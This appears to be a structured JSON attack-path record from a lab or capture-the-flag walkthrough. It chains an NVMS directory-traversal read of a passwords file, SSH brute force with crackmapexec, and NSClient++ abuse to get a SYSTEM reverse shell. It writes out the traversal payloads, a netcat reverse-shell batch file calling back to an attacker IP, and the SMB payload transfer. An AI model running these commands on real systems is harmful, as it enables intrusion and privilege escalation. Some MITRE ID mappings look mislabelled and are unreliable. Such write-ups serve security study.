@@ -1,0 +1,281 @@
+{
+  "id": "ap-0029",
+  "title": "NVMS Directory Traversal, Credential Brute Force, and NSClient++ Privilege Escalation",
+  "summary": "Exploitation of a Directory Traversal (LFI) vulnerability in the NVMS web service to obtain user credentials, followed by SMB brute force and local privilege escalation achieved by abusing the misconfigured NSClient++ service reload function.",
+  "attack_path_markdown": "### Step 1\nReconnaissance: Identify open ports, OS, and services.\n### Step 2\nLeverage NVMS Directory Traversal vulnerability to read local files and steal credentials.\n### Step 3\nUtilize recovered credentials to gain initial access via brute force over SSH.\n### Step 4\nUse SSH Local Port Forwarding to access the restricted NSClient++ web interface.\n### Step 5\nAbuse NSClient++ service configuration by setting up a malicious external script (`evil.bat`).\n### Step 6\nTrigger service reload via the web panel to execute the privileged reverse shell.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target's operating system, open ports, and running services.",
+      "actions": [
+        "Ping target IP to confirm active status.",
+        "Identify operating system (Windows) using TTL value (127/128).",
+        "Perform an aggressive full port scan."
+      ],
+      "tools": [
+        "ping",
+        "python script (OS detection)",
+        "nmap"
+      ],
+      "techniques": [
+        "OS Fingerprinting",
+        "Service Enumeration (Full Port Scan)"
+      ],
+      "mitre_ids": [
+        "T1595.001",
+        "T1046"
+      ],
+      "indicators": [
+        "TTL 127/128 (Windows)",
+        "Open Ports: 21 (FTP), 22 (SSH), 80 (HTTP), 8443 (HTTPS/NSClient++)"
+      ],
+      "preconditions": "Network connectivity to the target IP (10.10.10.184)",
+      "expected_outcome": "List of open ports, services, and OS confirmation.",
+      "confidence": 1.0,
+      "commands": [
+        "ping 10.10.10.184",
+        "nmap -p- --open -sS -vvv -n -Pn 10.10.10.184 -oG ports"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparing the necessary exploit information and payload files.",
+      "actions": [
+        "Identify Directory Traversal vulnerability for NVMS (LFI).",
+        "Prepare the malicious batch script (`evil.bat`) for reverse shell execution.",
+        "Acquire Netcat executable (`nc.exe`) for Windows."
+      ],
+      "tools": [
+        "searchsploit",
+        "Netcat (nc.exe)",
+        "Text editor (for evil.bat)"
+      ],
+      "techniques": [
+        "Vulnerability Research (NVMS)",
+        "Payload creation"
+      ],
+      "mitre_ids": [
+        "T1588.002"
+      ],
+      "indicators": [
+        "Existence of Directory Traversal exploit (41549.txt)",
+        "Creation of `evil.bat` containing reverse shell command."
+      ],
+      "preconditions": "Knowledge of target NVMS software version.",
+      "expected_outcome": "Payloads ready on the attacker machine.",
+      "confidence": 1.0,
+      "commands": [
+        "searchsploit nvms",
+        "echo 'netcat.exe 10.10.14.29 443 -e cmd.exe' > evil.bat "
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Using the LFI to access credentials and transferring payloads to the compromised system via SMB.",
+      "actions": [
+        "Exploit Directory Traversal to read configuration files (validation).",
+        "Exploit Directory Traversal to read `passwords.txt` from Nathan's desktop.",
+        "Set up an SMB server on the attacker machine.",
+        "Transfer `evil.bat` and `netcat.exe` to a temporary directory on the victim machine."
+      ],
+      "tools": [
+        "Burp Suite Repeater",
+        "smbserver.py (Impacket)",
+        "net use (Windows)",
+        "copy (Windows)"
+      ],
+      "techniques": [
+        "Local File Inclusion (LFI)/Directory Traversal [85, 87, T1589]",
+        "Data Transfer (SMB) [108, 110, T1105]"
+      ],
+      "mitre_ids": [
+        "T1589",
+        "T1105"
+      ],
+      "indicators": [
+        "Successful reading of sensitive files (e.g., etc/hosts).",
+        "Obtained password list from `passwords.txt`."
+      ],
+      "preconditions": "Working LFI exploit path, SMB service running on attacker's machine.",
+      "expected_outcome": "Valid user credentials obtained (nadine: LikeBigB0xW0rk), and payload files are stored in `C:\\temp`.",
+      "confidence": 1.0,
+      "commands": [
+        "PAYLOAD: /main.php?page=../../../../../../../../../../../../Windows/System32/drivers/etc/hosts",
+        "PAYLOAD: /main.php?page=../../../../../../../../../../../../Users/nathan/Desktop/passwords.txt",
+        "smbserver.py SMB_Folder /path/to/payloads -smb2support",
+        "net use x: \\\\10.10.14.29\\SMB_Folder /user:shavitar shavitar123",
+        "copy x:\\evil.bat C:\\temp\\evil.bat",
+        "copy x:\\netcat.exe C:\\temp\\netcat.exe"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Gaining initial user-level access to the system using discovered credentials.",
+      "actions": [
+        "Brute force discovered credentials against the SMB service to find valid pairs.",
+        "Log into the target machine via SSH using the valid credentials."
+      ],
+      "tools": [
+        "crackmapexec",
+        "sshpass",
+        "ssh "
+      ],
+      "techniques": [
+        "Brute Force (T1110)",
+        "Remote Access via SSH (T1021.004)"
+      ],
+      "mitre_ids": [
+        "T1110",
+        "T1021.004"
+      ],
+      "indicators": [
+        "Successful login via SSH as 'nadine'."
+      ],
+      "preconditions": "Valid credentials for a user (nadine).",
+      "expected_outcome": "Low-privileged shell obtained (Domain User: nadine).",
+      "confidence": 1.0,
+      "commands": [
+        "crackmapexec ssh 10.10.10.184 -u users.txt -p passwords.txt --continue-on-success",
+        "sshpass -p 'LikeBigB0xW0rk' ssh nadine@10.10.10.184"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Configuring the high-privileged NSClient++ service to execute the reverse shell payload upon restart.",
+      "actions": [
+        "Identify the NSClient++ web password using the local utility.",
+        "Apply Local Port Forwarding via SSH to bypass network restrictions.",
+        "Access NSClient++ web interface via localhost:8443.",
+        "Configure an external script entry (`reverse`) to execute `C:\\temp\\evil.bat`.",
+        "Set up Netcat listener on the attacker machine."
+      ],
+      "tools": [
+        "nscp.exe",
+        "ssh (Local Port Forwarding)",
+        "Browser/Web Panel",
+        "netcat [27]"
+      ],
+      "techniques": [
+        "Port Forwarding (T1090)",
+        "Scheduled Task/Job Abuse (Misconfigured Service Execution, T1543.003)"
+      ],
+      "mitre_ids": [
+        "T1090",
+        "T1543.003"
+      ],
+      "indicators": [
+        "Successful connection to the NSClient++ dashboard via localhost:8443.",
+        "Configuration saved with `reverse` script entry."
+      ],
+      "preconditions": "Low-privileged SSH access, working NSClient++ password, payloads uploaded.",
+      "expected_outcome": "System ready to execute the reverse shell with high privileges.",
+      "confidence": 0.9,
+      "commands": [
+        "C:\\Program Files\\NSClient++\\nscp.exe web_password_display",
+        "ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184",
+        "nc -lvnp 443 [27]",
+        "(NSClient++ Web Panel Action): Add External Script: Command: C:\\temp\\evil.bat"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Executing the configuration change to trigger the privileged reverse shell connection back to the attacker.",
+      "actions": [
+        "Trigger the NSClient++ service reload via the web interface control panel."
+      ],
+      "tools": [
+        "Browser/Web Panel"
+      ],
+      "techniques": [
+        "Reverse Shell Execution (T1049)"
+      ],
+      "mitre_ids": [
+        "T1049"
+      ],
+      "indicators": [
+        "Service reload initiated (Reload button pressed).",
+        "Attacker Netcat listener receives connection."
+      ],
+      "preconditions": "Netcat listener active, NSClient++ service configured with the reverse shell payload.",
+      "expected_outcome": "Receiving a reverse shell running with NT AUTHORITY\\SYSTEM privileges.",
+      "confidence": 1.0,
+      "commands": [
+        "(NSClient++ Web Panel Action): Navigate to Control -> Reload/Restart"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving maximum privilege access and retrieving the final flag.",
+      "actions": [
+        "Verify shell privileges (NT AUTHORITY\\SYSTEM).",
+        "Navigate to the Administrator desktop.",
+        "Read the flag file."
+      ],
+      "tools": [
+        "cmd.exe shell"
+      ],
+      "techniques": [
+        "Privilege Escalation (Service Execution)",
+        "Data Collection (T1005)"
+      ],
+      "mitre_ids": [
+        "T1005"
+      ],
+      "indicators": [
+        "Shell running as NT AUTHORITY\\SYSTEM."
+      ],
+      "preconditions": "High-privileged reverse shell established.",
+      "expected_outcome": "Final system compromise and flag retrieval.",
+      "confidence": 1.0,
+      "commands": [
+        "whoami [32]",
+        "cd C:\\Users\\Administrator\\Desktop",
+        "type flag.txt"
+      ]
+    }
+  ],
+  "tactics": [
+    "Reconnaissance",
+    "Credential Access",
+    "Privilege Escalation",
+    "Lateral Movement",
+    "Initial Access"
+  ],
+  "techniques": [
+    "Directory Traversal (LFI)",
+    "Brute Force",
+    "Remote Access (SSH)",
+    "Port Forwarding",
+    "Service Execution (NSClient++)"
+  ],
+  "mitre_ids": [
+    "T1589",
+    "T1110",
+    "T1021.004",
+    "T1090",
+    "T1543.003"
+  ],
+  "hosts": [
+    "10.10.10.184"
+  ],
+  "privs_obtained": [
+    "Domain User (nadine)",
+    "NT AUTHORITY\\SYSTEM"
+  ],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "The attack sequence relies heavily on chained vulnerabilities: LFI provides credentials, and misconfigured local access allows privileged command execution.",
+  "labels": [
+    "attack_path",
+    "lfi",
+    "privesc",
+    "windows"
+  ]
+}
